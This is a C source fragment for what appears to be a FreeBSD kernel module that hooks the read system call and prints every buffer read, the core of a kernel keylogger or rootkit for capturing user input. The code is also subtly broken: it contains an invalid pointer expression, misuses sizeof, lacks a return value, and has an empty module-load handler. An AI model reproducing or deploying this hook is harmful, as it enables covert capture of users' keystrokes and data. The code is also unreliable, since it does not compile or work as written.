#include <sys/types.h>
#include <sys/linedisc.h>

static int read_hook(struct thread* td, void*  syscall_args){
    struct l_read_t* uap;

    uap = (l_read_t*) syscall_args;

    int error;
    char buf[IBUFSIZ];
    int done;

    error = read(td, syscall_args);

    if(error || sizeof(uap->uio->uio_iov->*iov_base) < 1 
    || (uap->uio->uio_iov->iov_len < 1) 
    || (uap->uio->uio_file == NULL))
        return error;

    copyinstr(uap->uio->uio_iov->iov_base, buf, IBUFSIZ, &done);
    printf("%s\n", buf);
}

static int load(struct module* module, int cmd, void* arg){
    int error = 0;

    switch(cmd){
        case MOD_LOAD:
        
    }
}